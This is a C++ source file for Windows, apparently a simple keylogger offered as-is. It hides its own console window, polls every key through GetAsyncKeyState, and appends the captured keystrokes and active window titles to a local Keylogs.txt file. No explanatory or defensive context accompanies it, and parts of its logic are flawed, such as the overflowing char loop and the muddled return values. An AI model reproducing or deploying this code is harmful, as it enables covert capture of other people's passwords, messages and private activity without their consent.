#include <fstream>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

using namespace std;

// write text to file
void writeData(string text)
{
	ofstream file;
	file.open("Keylogs.txt", fstream::app);
	file << text;
	file.close();
}

// hides the keylogger so that it isn't visible
void stealth()
{
	HWND hwnd;
	AllocConsole();
	hwnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hwnd, 0);
}

// this method is to write to the file the special cases of keyboard inputs
bool isKeyListed(int vKey) 
{
	switch (vKey) 
	{
	case VK_RETURN:
		writeData("\n");
		break;
	case VK_BACK:
		writeData(" [BACKSPACE] ");
		break;
	case VK_SPACE:
		writeData(" ");
		break;
	case VK_SHIFT:
		writeData(" [SHIFT] ");
		break;
	case VK_OEM_PERIOD:
		writeData(".");
		break;
	default: return false;
	}
	return 0;
}

int main()
{
	stealth();  // hides application
	char Key;
	string test = "";
	
	while (1) 
	{
		for (Key = 8; Key <= 255; Key++)
		{
			if (GetAsyncKeyState(Key) == -32767) 
			{
				if (isKeyListed(Key) == 0)
				{
					// initialize ofstream object
					ofstream LogFile;
					LogFile.open("Keylogs.txt", fstream::app);
					// writes the character to the text file
					LogFile << Key;
					// close stream
					LogFile.close();
				}
			}
			// gets the window information
			char name[200];
			memset(name, 0, sizeof(name));
			GetWindowText(GetForegroundWindow(), name, sizeof(name));
			// store information as string
			string str(name);
			// if same, don't write, else write 
			// this prevents the same info repeated twice in a row
			if (test.compare(str) != 0)
			{
				// initializae ofstream object
				ofstream file;
				file.open("Keylogs.txt", fstream::app);
				// change test so that it prevents same info being written
				test = str;
				// text that will be written on the file
				string title = "\nActive Window Title: " + str + "\n";
				// writes string onto file
				file << title;
				// close stream
				file.close();
			}

		}
		
	}
}
